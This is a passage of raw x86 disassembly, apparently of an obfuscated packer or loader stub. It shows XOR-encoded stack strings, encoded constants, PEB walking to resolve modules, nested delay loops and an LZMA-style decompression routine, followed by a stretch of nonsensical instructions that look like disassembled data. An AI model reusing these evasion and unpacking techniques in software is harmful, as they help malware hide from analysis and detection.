  4246d9:	mov    WORD PTR [ebp-0x8a],ax
  4246e0:	mov    eax,0x99f1
  4246e5:	mov    WORD PTR [ebp-0x88],ax
  4246ec:	mov    eax,0x8d60
  4246f1:	mov    WORD PTR [ebp-0x86],ax
  4246f8:	mov    eax,0xd66f
  4246fd:	mov    WORD PTR [ebp-0x84],ax
  424704:	mov    eax,0xd783
  424709:	mov    WORD PTR [ebp-0x82],ax
  424710:	mov    eax,0x2782
  424715:	mov    WORD PTR [ebp-0x80],ax
  424719:	mov    eax,0x4782
  42471e:	mov    WORD PTR [ebp-0x7e],ax
  424722:	mov    eax,0x4e33
  424727:	push   0x8
  424729:	mov    WORD PTR [ebp-0x7c],ax
  42472d:	mov    DWORD PTR [ebp-0x10],0x8171b0c
  424734:	mov    DWORD PTR [ebp-0xc],0x831a1322
  42473b:	lea    eax,[ebp-0x10]
  42473e:	pop    ecx
  42473f:	mov    dl,BYTE PTR [eax]
  424741:	xor    dl,0x7d
  424744:	add    dl,0x2
  424747:	mov    BYTE PTR [eax],dl
  424749:	inc    eax
  42474a:	dec    ecx
  42474b:	jne    0x42473f
  42474d:	lea    eax,[ebp-0x10]
  424750:	mov    DWORD PTR [ebp-0xdc],eax
  424756:	lea    eax,[ebp-0xe0]
  42475c:	push   eax
  42475d:	mov    eax,DWORD PTR [ebp+0xc]
  424760:	xor    eax,edi
  424762:	add    eax,ebx
  424764:	push   eax
  424765:	mov    eax,DWORD PTR [ebp-0x4]
  424768:	add    eax,0x66
  42476b:	push   eax
  42476c:	mov    eax,DWORD PTR [ebp-0x4]
  42476f:	mov    eax,DWORD PTR [eax+0x198]
  424775:	mov    DWORD PTR [ebp-0xe0],0x1
  42477f:	push   DWORD PTR [eax]
  424781:	mov    eax,DWORD PTR [ebp+0x10]
  424784:	call   eax
  424786:	mov    ecx,DWORD PTR [ebp+0x8]
  424789:	xor    ecx,edi
  42478b:	add    ecx,ebx
  42478d:	mov    DWORD PTR [ebp-0x8],eax
  424790:	cmp    eax,ecx
  424792:	jne    0x4247ad
  424794:	mov    eax,ds:0x33730bc8
  424799:	or     eax,0x22150bcf
  42479e:	mov    ds:0x33730bc8,eax
  4247a3:	add    eax,0x3372e92f
  4247a8:	mov    ds:0x33730bc8,eax
  4247ad:	mov    ecx,0x4e64
  4247b2:	mov    eax,ecx
  4247b4:	mov    WORD PTR [ebp-0x40],ax
  4247b8:	add    eax,0x7
  4247bb:	mov    edx,eax
  4247bd:	mov    WORD PTR [ebp-0x3e],dx
  4247c1:	mov    edx,0x4f93
  4247c6:	mov    WORD PTR [ebp-0x3c],dx
  4247ca:	add    edx,0xfffffff8
  4247cd:	mov    WORD PTR [ebp-0x3a],dx
  4247d1:	mov    edx,0x4f8d
  4247d6:	mov    WORD PTR [ebp-0x38],dx
  4247da:	inc    edx
  4247db:	mov    WORD PTR [ebp-0x36],dx
  4247df:	mov    edx,0x4f87
  4247e4:	mov    WORD PTR [ebp-0x34],dx
  4247e8:	mov    WORD PTR [ebp-0x32],cx
  4247ec:	mov    ecx,esi
  4247ee:	mov    WORD PTR [ebp-0x30],cx
  4247f2:	lea    ecx,[edx-0x3]
  4247f5:	mov    edx,ecx
  4247f7:	mov    WORD PTR [ebp-0x54],dx
  4247fb:	mov    edx,eax
  4247fd:	mov    WORD PTR [ebp-0x52],dx
  424801:	mov    edx,0x4e73
  424806:	mov    WORD PTR [ebp-0x50],dx
  42480a:	mov    WORD PTR [ebp-0x4e],ax
  42480e:	lea    eax,[edx-0x6]
  424811:	mov    WORD PTR [ebp-0x4c],ax
  424815:	inc    eax
  424816:	mov    WORD PTR [ebp-0x4a],ax
  42481a:	lea    eax,[edx-0xc]
  42481d:	mov    WORD PTR [ebp-0x48],ax
  424821:	mov    WORD PTR [ebp-0x46],cx
  424825:	mov    WORD PTR [ebp-0x44],si
  424829:	mov    eax,DWORD PTR [ebp+0x8]
  42482c:	movzx  ecx,WORD PTR [ebp-0x54]
  424830:	xor    eax,edi
  424832:	add    eax,ebx
  424834:	xor    eax,ecx
  424836:	mov    WORD PTR [ebp-0x54],ax
  42483a:	mov    eax,DWORD PTR [ebp+0x8]
  42483d:	movzx  ecx,WORD PTR [ebp-0x40]
  424841:	xor    eax,edi
  424843:	add    eax,ebx
  424845:	xor    eax,ecx
  424847:	mov    WORD PTR [ebp-0x40],ax
  42484b:	xor    eax,eax
  42484d:	mov    WORD PTR [ebp-0xf4],ax
  424854:	mov    WORD PTR [ebp-0x108],ax
  42485b:	mov    edi,DWORD PTR [ebp+0x24]
  42485e:	lea    eax,[ebp-0xf4]
  424864:	lea    edx,[ebp-0x54]
  424867:	mov    DWORD PTR [ebp-0xe0],0x2
  424871:	mov    DWORD PTR [ebp-0xdc],eax
  424877:	call   0x4272b1
  42487c:	mov    DWORD PTR [ebp-0xd8],eax
  424882:	lea    eax,[ebp-0xe0]
  424888:	push   eax
  424889:	mov    eax,DWORD PTR [ebp+0xc]
  42488c:	xor    eax,0x75108ac
  424891:	add    eax,ebx
  424893:	push   eax
  424894:	lea    eax,[ebp-0x9c]
  42489a:	push   eax
  42489b:	push   DWORD PTR [ebp-0x8]
  42489e:	mov    eax,DWORD PTR [ebp+0x10]
  4248a1:	call   eax
  4248a3:	mov    edi,DWORD PTR [ebp+0x24]
  4248a6:	lea    eax,[ebp-0x108]
  4248ac:	lea    edx,[ebp-0x40]
  4248af:	mov    DWORD PTR [ebp-0xdc],eax
  4248b5:	call   0x4272b1
  4248ba:	mov    DWORD PTR [ebp-0xd8],eax
  4248c0:	mov    edi,0x75108ac
  4248c5:	mov    eax,DWORD PTR [ebp+0x14]
  4248c8:	push   DWORD PTR [ebp-0x4]
  4248cb:	push   DWORD PTR [ebp+0x20]
  4248ce:	push   DWORD PTR [ebp+0x1c]
  4248d1:	push   DWORD PTR [ebp+0x18]
  4248d4:	push   DWORD PTR [ebp+0x10]
  4248d7:	push   DWORD PTR [ebp+0x8]
  4248da:	push   DWORD PTR [ebp+0xc]
  4248dd:	call   0x425b50
  4248e2:	test   eax,eax
  4248e4:	je     0x424928
  4248e6:	add    DWORD PTR [ebp-0x4],eax
  4248e9:	push   DWORD PTR [ebp-0x4]
  4248ec:	lea    esi,[ebp+0x4]
  4248ef:	call   0x424d40
  4248f4:	mov    eax,DWORD PTR [ebp-0x4]
  4248f7:	mov    eax,DWORD PTR [eax+0x1c8]
  4248fd:	mov    eax,DWORD PTR [eax]
  4248ff:	xor    eax,edi
  424901:	add    eax,ebx
  424903:	mov    eax,DWORD PTR [ebp-0x4]
  424906:	jne    0x42491e
  424908:	mov    ecx,DWORD PTR [ebp-0x4]
  42490b:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424911:	push   DWORD PTR [ecx]
  424913:	mov    eax,DWORD PTR [eax+0x1e0]
  424919:	call   DWORD PTR [eax+0x28]
  42491c:	jmp    0x424928
  42491e:	mov    eax,DWORD PTR [eax+0x17c]
  424924:	mov    eax,DWORD PTR [eax]
  424926:	add    DWORD PTR [esi],eax
  424928:	mov    eax,DWORD PTR [ebp-0x4]
  42492b:	mov    eax,DWORD PTR [eax+0x1dc]
  424931:	dec    DWORD PTR [eax]
  424933:	mov    ecx,DWORD PTR [ebp-0x4]
  424936:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42493c:	mov    eax,DWORD PTR [eax]
  42493e:	lea    eax,[ecx+eax*4]
  424941:	mov    ecx,DWORD PTR [ebp-0x4]
  424944:	mov    ecx,DWORD PTR [ecx+0x17c]
  42494a:	mov    eax,DWORD PTR [eax]
  42494c:	mov    ecx,DWORD PTR [ecx]
  42494e:	add    DWORD PTR [eax],ecx
  424950:	pop    edi
  424951:	pop    esi
  424952:	pop    ebx
  424953:	leave  
  424954:	ret    0x20
  424957:	push   edi
  424958:	push   esi
  424959:	push   ebx
  42495a:	push   ebp
  42495b:	mov    ebp,esp
  42495d:	mov    eax,DWORD PTR [ebp+0x24]
  424960:	add    DWORD PTR [ebp+0x28],eax
  424963:	push   eax
  424964:	cld    
  424965:	mov    esi,DWORD PTR [ebp+0x18]
  424968:	add    DWORD PTR [ebp+0x1c],esi
  42496b:	push   esi
  42496c:	mov    esi,DWORD PTR [ebp+0x14]
  42496f:	lods   eax,DWORD PTR ds:[esi]
  424970:	xchg   edx,eax
  424971:	push   edx
  424972:	mov    cl,BYTE PTR [esi-0x2]
  424975:	or     eax,0xffffffff
  424978:	shl    eax,cl
  42497a:	not    eax
  42497c:	push   eax
  42497d:	mov    cl,dh
  42497f:	or     eax,0xffffffff
  424982:	shl    eax,cl
  424984:	not    eax
  424986:	push   eax
  424987:	add    cl,dl
  424989:	mov    edi,esi
  42498b:	sub    esp,0xc
  42498e:	sub    eax,eax
  424990:	inc    eax
  424991:	push   eax
  424992:	push   eax
  424993:	push   eax
  424994:	push   eax
  424995:	push   eax
  424996:	push   edi
  424997:	sub    esi,esi
  424999:	push   esi
  42499a:	or     ebx,0xffffffff
  42499d:	mov    eax,0x300
  4249a2:	shl    eax,cl
  4249a4:	lea    ecx,[eax+0x736]
  4249aa:	mov    eax,0x4000400
  4249af:	shr    ecx,1
  4249b1:	rep stos DWORD PTR es:[edi],eax
  4249b3:	push   0x5
  4249b5:	pop    ecx
  4249b6:	call   0x424ca1
  4249bb:	loop   0x4249b6
  4249bd:	lea    esi,[esi]
  4249bf:	lea    edi,[edi]
  4249c1:	mov    edi,DWORD PTR [ebp-0x4]
  4249c4:	mov    eax,DWORD PTR [ebp-0x10]
  4249c7:	sub    edi,DWORD PTR [ebp+0x24]
  4249ca:	and    eax,edi
  4249cc:	mov    DWORD PTR [ebp-0x18],eax
  4249cf:	mov    al,0x0
  4249d1:	call   0x424cb9
  4249d6:	jne    0x424a71
  4249dc:	mov    cl,BYTE PTR [ebp-0xc]
  4249df:	and    edi,DWORD PTR [ebp-0x14]
  4249e2:	shl    edi,cl
  4249e4:	sub    cl,0x8
  4249e7:	neg    cl
  4249e9:	shr    esi,cl
  4249eb:	pop    eax
  4249ec:	add    edi,esi
  4249ee:	pop    esi
  4249ef:	lea    edi,[edi+edi*2]
  4249f2:	shl    edi,0x8
  4249f5:	cmp    al,0x7
  4249f7:	pop    edx
  4249f8:	lea    ecx,[esi+edi*2+0xe6c]
  4249ff:	push   ecx
  424a00:	push   esi
  424a01:	mov    esi,0x100
  424a06:	push   eax
  424a07:	mov    al,0x1
  424a09:	jb     0x424a3f
  424a0b:	mov    edi,DWORD PTR [ebp-0x4]
  424a0e:	sub    edi,DWORD PTR [ebp-0x24]
  424a11:	movzx  edi,BYTE PTR [edi]
  424a14:	mov    ebp,DWORD PTR [ebp-0x34]
  424a17:	shl    edi,1
  424a19:	mov    ecx,esi
  424a1b:	and    esi,edi
  424a1d:	add    ecx,esi
  424a1f:	lea    ebp,[ebp+ecx*2+0x0]
  424a23:	call   0x424cd8
  424a28:	mov    ecx,eax
  424a2a:	shr    esi,0x8
  424a2d:	and    ecx,0x1
  424a30:	cmp    esi,ecx
  424a32:	mov    esi,0x100
  424a37:	jne    0x424a47
  424a39:	cmp    eax,esi
  424a3b:	jb     0x424a14
  424a3d:	jmp    0x424a53
  424a3f:	mov    ebp,DWORD PTR [ebp-0x34]
  424a42:	call   0x424cd8
  424a47:	inc    eax
  424a48:	inc    esi
  424a49:	sub    eax,0x1
  424a4c:	sub    esi,0x1
  424a4f:	cmp    eax,esi
  424a51:	jb     0x424a3f
  424a53:	pop    edx
  424a54:	inc    edx
  424a55:	cmp    edx,0x5
  424a58:	dec    edx
  424a59:	mov    ecx,edx
  424a5b:	jb     0x424a6c
  424a5d:	inc    edx
  424a5e:	cmp    edx,0xb
  424a61:	dec    edx
  424a62:	mov    cl,0x4
  424a64:	dec    cl
  424a66:	jb     0x424a6c
  424a68:	mov    cl,0x7
  424a6a:	dec    cl
  424a6c:	sub    edx,ecx
  424a6e:	push   edx
  424a6f:	jmp    0x424ac0
  424a71:	mov    al,0xc1
  424a73:	dec    al
  424a75:	call   0x424cc9
  424a7a:	jne    0x424a90
  424a7c:	pop    eax
  424a7d:	pop    edi
  424a7e:	pop    edx
  424a7f:	pop    ecx
  424a80:	pop    edx
  424a81:	pop    ecx
  424a82:	push   DWORD PTR [esp]
  424a85:	push   ecx
  424a86:	push   edx
  424a87:	mov    edx,0x664
  424a8c:	mov    cl,0x0
  424a8e:	jmp    0x424b03
  424a90:	mov    al,0xcd
  424a92:	dec    al
  424a94:	call   0x424cc9
  424a99:	jne    0x424ac9
  424a9b:	mov    al,0xf1
  424a9d:	dec    al
  424a9f:	call   0x424cb9
  424aa4:	jne    0x424af9
  424aa6:	pop    eax
  424aa7:	cmp    al,0x7
  424aa9:	mov    al,0x9
  424aab:	jb     0x424aaf
  424aad:	mov    al,0xb
  424aaf:	push   eax
  424ab0:	mov    esi,DWORD PTR [ebp-0x4]
  424ab3:	sub    esi,DWORD PTR [ebp-0x24]
  424ab6:	cmp    esi,DWORD PTR [ebp+0x24]
  424ab9:	jb     0x424c90
  424abf:	lods   al,BYTE PTR ds:[esi]
  424ac0:	mov    edi,DWORD PTR [ebp-0x4]
  424ac3:	stos   BYTE PTR es:[edi],al
  424ac4:	jmp    0x424c57
  424ac9:	mov    al,0xd8
  424acb:	call   0x424cc9
  424ad0:	mov    esi,DWORD PTR [ebp-0x28]
  424ad3:	je     0x424af0
  424ad5:	mov    al,0xe4
  424ad7:	call   0x424cc9
  424adc:	mov    esi,DWORD PTR [ebp-0x2c]
  424adf:	je     0x424aea
  424ae1:	mov    esi,DWORD PTR [ebp-0x30]
  424ae4:	mov    ecx,DWORD PTR [ebp-0x2c]
  424ae7:	mov    DWORD PTR [ebp-0x30],ecx
  424aea:	mov    ecx,DWORD PTR [ebp-0x28]
  424aed:	mov    DWORD PTR [ebp-0x2c],ecx
  424af0:	mov    ecx,DWORD PTR [ebp-0x24]
  424af3:	mov    DWORD PTR [ebp-0x28],ecx
  424af6:	mov    DWORD PTR [ebp-0x24],esi
  424af9:	pop    eax
  424afa:	pop    edi
  424afb:	pop    ecx
  424afc:	mov    edx,0xa68
  424b01:	mov    cl,0x8
  424b03:	add    edx,edi
  424b05:	push   edx
  424b06:	push   edi
  424b07:	cmp    al,0x7
  424b09:	mov    al,cl
  424b0b:	jb     0x424b0f
  424b0d:	add    al,0x3
  424b0f:	push   eax
  424b10:	mov    ebp,DWORD PTR [ebp-0x34]
  424b13:	call   0x424cd6
  424b18:	jne    0x424b2e
  424b1a:	mov    eax,DWORD PTR [ebp-0x18]
  424b1d:	mov    edi,DWORD PTR [ebp-0x34]
  424b20:	shl    eax,0x3
  424b23:	sub    ecx,ecx
  424b25:	push   0x8
  424b27:	pop    esi
  424b28:	lea    edi,[edi+eax*2+0x4]
  424b2c:	jmp    0x424b63
  424b2e:	mov    ebp,DWORD PTR [ebp-0x34]
  424b31:	add    ebp,0x2
  424b34:	call   0x424cd6
  424b39:	jne    0x424b53
  424b3b:	mov    eax,DWORD PTR [ebp-0x18]
  424b3e:	mov    edi,DWORD PTR [ebp-0x34]
  424b41:	shl    eax,0x3
  424b44:	push   0x8
  424b46:	pop    ecx
  424b47:	push   0x8
  424b49:	pop    esi
  424b4a:	lea    edi,[edi+eax*2+0x104]
  424b51:	jmp    0x424b63
  424b53:	mov    edi,0x204
  424b58:	add    edi,DWORD PTR [ebp-0x34]
  424b5b:	push   0x10
  424b5d:	pop    ecx
  424b5e:	mov    esi,0x100
  424b63:	mov    DWORD PTR [ebp-0x1c],ecx
  424b66:	sub    eax,eax
  424b68:	inc    eax
  424b69:	mov    ebp,edi
  424b6b:	call   0x424cd8
  424b70:	mov    ecx,eax
  424b72:	sub    ecx,esi
  424b74:	jb     0x424b69
  424b76:	add    DWORD PTR [ebp-0x1c],ecx
  424b79:	cmp    DWORD PTR [ebp-0x3c],0x4
  424b7d:	jae    0x424c33
  424b83:	add    DWORD PTR [ebp-0x3c],0x7
  424b87:	mov    ecx,DWORD PTR [ebp-0x1c]
  424b8a:	cmp    ecx,0x4
  424b8d:	jb     0x424b92
  424b8f:	push   0x3
  424b91:	pop    ecx
  424b92:	mov    edi,DWORD PTR [ebp-0x38]
  424b95:	shl    ecx,0x6
  424b98:	sub    eax,eax
  424b9a:	inc    eax
  424b9b:	push   0x40
  424b9d:	pop    esi
  424b9e:	lea    edi,[edi+ecx*2+0x360]
  424ba5:	mov    ebp,edi
  424ba7:	call   0x424cd8
  424bac:	mov    ecx,eax
  424bae:	sub    ecx,esi
  424bb0:	jb     0x424ba5
  424bb2:	mov    DWORD PTR [ebp-0x18],ecx
  424bb5:	mov    DWORD PTR [ebp-0x24],ecx
  424bb8:	cmp    ecx,0x4
  424bbb:	jb     0x424c30
  424bbd:	mov    esi,ecx
  424bbf:	and    DWORD PTR [ebp-0x24],0x1
  424bc3:	shr    esi,1
  424bc5:	or     DWORD PTR [ebp-0x24],0x2
  424bc9:	dec    esi
  424bca:	cmp    ecx,0xe
  424bcd:	jae    0x424be8
  424bcf:	mov    eax,0x2af
  424bd4:	sub    eax,ecx
  424bd6:	mov    ecx,esi
  424bd8:	shl    BYTE PTR [ebp-0x24],cl
  424bdb:	add    eax,DWORD PTR [ebp-0x24]
  424bde:	shl    eax,1
  424be0:	add    eax,DWORD PTR [ebp-0x38]
  424be3:	mov    DWORD PTR [ebp-0x34],eax
  424be6:	jmp    0x424c15
  424be8:	sub    esi,0x4
  424beb:	call   0x424c95
  424bf0:	shr    ebx,1
  424bf2:	shl    DWORD PTR [ebp-0x24],1
  424bf5:	cmp    DWORD PTR [ebp-0x20],ebx
  424bf8:	jb     0x424c00
  424bfa:	inc    DWORD PTR [ebp-0x24]
  424bfd:	sub    DWORD PTR [ebp-0x20],ebx
  424c00:	dec    esi
  424c01:	jne    0x424beb
  424c03:	mov    eax,0x644
  424c08:	add    eax,DWORD PTR [ebp-0x38]
  424c0b:	mov    DWORD PTR [ebp-0x34],eax
  424c0e:	shl    DWORD PTR [ebp-0x24],0x4
  424c12:	push   0x4
  424c14:	pop    esi
  424c15:	sub    edi,edi
  424c17:	inc    edi
  424c18:	mov    eax,edi
  424c1a:	mov    ebp,DWORD PTR [ebp-0x34]
  424c1d:	call   0x424cd8
  424c22:	test   al,0x1
  424c24:	je     0x424c29
  424c26:	or     DWORD PTR [ebp-0x24],edi
  424c29:	shl    edi,1
  424c2b:	dec    esi
  424c2c:	jne    0x424c1a
  424c2e:	jmp    0x424c30
  424c30:	inc    DWORD PTR [ebp-0x24]
  424c33:	mov    ecx,DWORD PTR [ebp-0x1c]
  424c36:	add    ecx,0x2
  424c39:	mov    edi,DWORD PTR [ebp-0x4]
  424c3c:	mov    eax,edi
  424c3e:	sub    eax,DWORD PTR [ebp+0x24]
  424c41:	cmp    DWORD PTR [ebp-0x24],eax
  424c44:	ja     0x424c90
  424c46:	mov    esi,edi
  424c48:	sub    esi,DWORD PTR [ebp-0x24]
  424c4b:	mov    edx,DWORD PTR [ebp+0x28]
  424c4e:	lods   al,BYTE PTR ds:[esi]
  424c4f:	stos   BYTE PTR es:[edi],al
  424c50:	cmp    edi,edx
  424c52:	jae    0x424c57
  424c54:	dec    ecx
  424c55:	jne    0x424c4e
  424c57:	mov    DWORD PTR [ebp-0x4],edi
  424c5a:	movzx  esi,al
  424c5d:	cmp    edi,DWORD PTR [ebp+0x28]
  424c60:	jb     0x4249c1
  424c66:	call   0x424c95
  424c6b:	sub    eax,eax
  424c6d:	lea    ebp,[esp+0x3c]
  424c71:	mov    edx,DWORD PTR [ebp+0x20]
  424c74:	mov    esi,DWORD PTR [ebp-0x8]
  424c77:	sub    esi,DWORD PTR [ebp+0x18]
  424c7a:	mov    DWORD PTR [edx],esi
  424c7c:	mov    edx,DWORD PTR [ebp+0x2c]
  424c7f:	mov    edi,DWORD PTR [edx+edi*2+0x33]
  424c83:	jl     0x424c9c
  424c85:	lods   eax,DWORD PTR ds:[esi]
  424c86:	outs   dx,DWORD PTR ds:[esi]
  424c87:	scas   al,BYTE PTR es:[edi]
  424c88:	hlt    
  424c89:	add    BYTE PTR [edx+edx*4],al
  424c8c:	test   DWORD PTR [edi-0x75cc1800],0x8dea3688
  424c96:	jbe    0x424c1f
  424c98:	xchg   DWORD PTR [edi-0x6974af75],eax
  424c9e:	mov    ss,WORD PTR [esi]
  424ca0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ca1:	loopne 0x424c58
  424ca3:	pop    esp
  424ca4:	push   0x73
  424ca6:	pop    esp
  424ca7:	not    DWORD PTR [edx+ebx*1-0x4b]
  424cab:	pushf  
  424cac:	or     cl,BYTE PTR [esi-0x52c658f6]
  424cb2:	pushf  
  424cb3:	or     ch,BYTE PTR [ebp-0x69ff95a4]
  424cb9:	mov    ch,0xbc
  424cbb:	call   0x970e:0x8e8a61c3
  424cc2:	xchg   ebx,eax
  424cc3:	pushf  
  424cc4:	sub    dl,BYTE PTR [ebx-0x3c60c972]
  424cca:	popa   
  424ccb:	mov    dl,BYTE PTR [ebx+0x3cb59a9c]
  424cd1:	stos   BYTE PTR es:[edi],al
  424cd2:	mov    ebp,0x33879c38
  424cd7:	mov    bh,BYTE PTR [ebp-0x727863c8]
  424cdd:	jbe    0x424c66
  424cdf:	xchg   DWORD PTR [edi-0x4a08ab75],eax
  424ce5:	mov    eax,0x188e6717
  424cea:	pop    ss
  424ceb:	pop    es
  424cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ced:	jae    0x424ca7
  424cef:	pop    ss
  424cf0:	clc    
  424cf1:	push   esp
  424cf2:	stc    
  424cf3:	mov    cl,0xcb
  424cf5:	xchg   BYTE PTR [eax+0x168e6717],bl
  424cfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424cfc:	test   eax,0x8b0717d8
  424d01:	retf   
  424d02:	movzx  edx,WORD PTR [ebp+0x0]
  424d06:	shr    ecx,0xb
  424d09:	imul   ecx,edx
  424d0c:	cmp    DWORD PTR [esp+0x20],ecx
  424d10:	jae    0x424d29
  424d12:	mov    ebx,ecx
  424d14:	mov    ecx,0x800
  424d19:	sub    ecx,edx
  424d1b:	shr    ecx,0x5
  424d1e:	add    WORD PTR [ebp+0x0],cx
  424d22:	add    eax,eax
  424d24:	lea    ebp,[esp+0x40]
  424d28:	ret    
  424d29:	shr    edx,0x5
  424d2c:	sub    DWORD PTR [esp+0x20],ecx
  424d30:	sub    ebx,ecx
  424d32:	sub    WORD PTR [ebp+0x0],dx
  424d36:	add    eax,eax
  424d38:	add    eax,0x1
  424d3b:	lea    ebp,[esp+0x40]
  424d3f:	ret    
  424d40:	push   ebp
  424d41:	mov    ebp,esp
  424d43:	sub    esp,0x12c
  424d49:	push   ebx
  424d4a:	push   esi
  424d4b:	push   edi
  424d4c:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  424d53:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  424d5a:	mov    eax,DWORD PTR [ebp+0x8]
  424d5d:	mov    DWORD PTR [ebp+0x8],eax
  424d60:	mov    ecx,DWORD PTR [ebp-0x10]
  424d63:	mov    ebx,0x75108ac
  424d68:	xor    ecx,ebx
  424d6a:	mov    eax,0x3272f3
  424d6f:	add    ecx,eax
  424d71:	mov    DWORD PTR [ebp-0x24],ecx
  424d74:	mov    ecx,DWORD PTR [ebp-0x10]
  424d77:	xor    ecx,ebx
  424d79:	add    ecx,eax
  424d7b:	mov    DWORD PTR [ebp-0x40],ecx
  424d7e:	mov    ecx,DWORD PTR [ebp-0x10]
  424d81:	xor    ecx,ebx
  424d83:	add    ecx,eax
  424d85:	mov    DWORD PTR [ebp-0x3c],ecx
  424d88:	mov    ecx,DWORD PTR [ebp-0x10]
  424d8b:	xor    ecx,ebx
  424d8d:	add    ecx,eax
  424d8f:	mov    DWORD PTR [ebp-0xd8],ecx
  424d95:	mov    DWORD PTR [ebp-0x50],0xf89f05a1
  424d9c:	mov    DWORD PTR [ebp-0x3c],0xf89cb5a1
  424da3:	mov    DWORD PTR [ebp-0x54],0xf89c85bd
  424daa:	push   0x25
  424dac:	pop    ecx
  424dad:	mov    DWORD PTR [ebp-0x30],ecx
  424db0:	mov    DWORD PTR [ebp-0x30],ecx
  424db3:	push   0x65
  424db5:	pop    ecx
  424db6:	mov    DWORD PTR [ebp-0x30],ecx
  424db9:	mov    DWORD PTR [ebp-0x30],ecx
  424dbc:	mov    DWORD PTR [ebp-0x30],0x4d
  424dc3:	mov    DWORD PTR [ebp-0x30],0x43
  424dca:	mov    ecx,DWORD PTR [ebp-0x10]
  424dcd:	xor    ecx,ebx
  424dcf:	add    ecx,eax
  424dd1:	mov    DWORD PTR [ebp-0x30],ecx
  424dd4:	mov    ecx,DWORD PTR [ebp-0x10]
  424dd7:	xor    ecx,ebx
  424dd9:	add    ecx,eax
  424ddb:	mov    DWORD PTR [ebp-0x30],ecx
  424dde:	mov    DWORD PTR [ebp-0x28],0x258
  424de5:	mov    DWORD PTR [ebp-0x34],0x36
  424dec:	mov    DWORD PTR [ebp-0x14],0x7a
  424df3:	lea    edi,[ebp-0x10c]
  424df9:	lea    esi,[ebp-0x12c]
  424dff:	call   0x425abf
  424e04:	dec    DWORD PTR [ebp-0x14]
  424e07:	jne    0x424df3
  424e09:	dec    DWORD PTR [ebp-0x34]
  424e0c:	jne    0x424dec
  424e0e:	dec    DWORD PTR [ebp-0x28]
  424e11:	jne    0x424de5
  424e13:	mov    DWORD PTR [ebp-0x28],0x400e
  424e1a:	mov    eax,DWORD PTR [ebp-0x10]
  424e1d:	xor    eax,ebx
  424e1f:	mov    esi,0x3272f3
  424e24:	add    eax,esi
  424e26:	mov    DWORD PTR [ebp-0x1c],eax
  424e29:	mov    eax,DWORD PTR [ebp-0x10]
  424e2c:	and    DWORD PTR [ebp-0x94],0x0
  424e33:	xor    eax,ebx
  424e35:	add    eax,esi
  424e37:	mov    DWORD PTR [ebp-0x38],eax
  424e3a:	mov    eax,fs:0x18
  424e40:	mov    DWORD PTR [ebp-0x94],eax
  424e46:	mov    eax,DWORD PTR [eax+0x30]
  424e49:	mov    DWORD PTR [ebp-0xcc],eax
  424e4f:	mov    eax,DWORD PTR [eax+0xc]
  424e52:	mov    DWORD PTR [ebp-0xc0],eax
  424e58:	mov    eax,DWORD PTR [ebp+0x8]
  424e5b:	lea    ecx,[ebp-0x94]
  424e61:	mov    DWORD PTR [eax+0x1a0],ecx
  424e67:	mov    eax,DWORD PTR [ebp+0x8]
  424e6a:	lea    ecx,[ebp-0xcc]
  424e70:	mov    DWORD PTR [eax+0x1a4],ecx
  424e76:	mov    eax,DWORD PTR [ebp+0x8]
  424e79:	push   DWORD PTR [ebp+0x8]
  424e7c:	lea    ecx,[ebp-0xc0]
  424e82:	mov    DWORD PTR [eax+0x1a8],ecx
  424e88:	call   0x427282
  424e8d:	mov    ecx,DWORD PTR [ebp-0x10]
  424e90:	xor    ecx,ebx
  424e92:	add    ecx,esi
  424e94:	cmp    ecx,eax
  424e96:	je     0x425219
  424e9c:	mov    eax,DWORD PTR [ebp+0x8]
  424e9f:	mov    eax,DWORD PTR [eax+0x194]
  424ea5:	mov    ecx,DWORD PTR [eax]
  424ea7:	mov    eax,DWORD PTR [ebp+0x8]
  424eaa:	mov    eax,DWORD PTR [eax+0x194]
  424eb0:	mov    eax,DWORD PTR [eax]
  424eb2:	add    eax,DWORD PTR [ecx+0x3c]
  424eb5:	mov    ecx,DWORD PTR [ebp+0x8]
  424eb8:	mov    ecx,DWORD PTR [ecx+0x1e0]
  424ebe:	lea    edx,[ebp-0xec]
  424ec4:	push   edx
  424ec5:	mov    edx,DWORD PTR [ebp+0x8]
  424ec8:	mov    edx,DWORD PTR [edx+0x18c]
  424ece:	mov    edx,DWORD PTR [edx]
  424ed0:	add    edx,DWORD PTR [eax+0x88]
  424ed6:	push   0x4
  424ed8:	push   DWORD PTR [eax+0x8c]
  424ede:	push   edx
  424edf:	call   DWORD PTR [ecx+0x1c]
  424ee2:	push   DWORD PTR [ebp+0x8]
  424ee5:	xor    eax,eax
  424ee7:	mov    DWORD PTR [ebp-0xa8],0x1b3c0c3a
  424ef1:	mov    DWORD PTR [ebp-0xa4],0x10370d22
  424efb:	mov    DWORD PTR [ebp-0xa0],0x420d1e08
  424f05:	mov    BYTE PTR [ebp-0x9c],0x83
  424f0c:	lea    edi,[ebp-0x9b]
  424f12:	stos   DWORD PTR es:[edi],eax
  424f13:	stos   WORD PTR es:[edi],ax
  424f15:	stos   BYTE PTR es:[edi],al
  424f16:	xor    eax,eax
  424f18:	mov    DWORD PTR [ebp-0xbc],0x1b3c0c3a
  424f22:	mov    DWORD PTR [ebp-0xb8],0x10370d22
  424f2c:	mov    DWORD PTR [ebp-0xb4],0x280d1e08
  424f36:	mov    BYTE PTR [ebp-0xb0],0x83
  424f3d:	lea    edi,[ebp-0xaf]
  424f43:	stos   DWORD PTR es:[edi],eax
  424f44:	stos   WORD PTR es:[edi],ax
  424f46:	stos   BYTE PTR es:[edi],al
  424f47:	mov    edi,DWORD PTR [ebp+0x8]
  424f4a:	mov    eax,DWORD PTR [ebp+0x8]
  424f4d:	mov    edx,DWORD PTR [eax+0x1b8]
  424f53:	mov    DWORD PTR [ebp-0x68],0xd0f0c17
  424f5a:	mov    DWORD PTR [ebp-0x64],0x1a13161c
  424f61:	mov    WORD PTR [ebp-0x60],0x8342
  424f67:	mov    DWORD PTR [ebp-0x90],0x1b3c0c3a
  424f71:	mov    DWORD PTR [ebp-0x8c],0x17420d22
  424f7b:	mov    DWORD PTR [ebp-0x88],0x31221b13
  424f85:	mov    DWORD PTR [ebp-0x84],0xd1e160e
  424f8f:	mov    DWORD PTR [ebp-0x80],0x83421c1a
  424f96:	mov    DWORD PTR [ebp-0x7c],0x1b3c0c3a
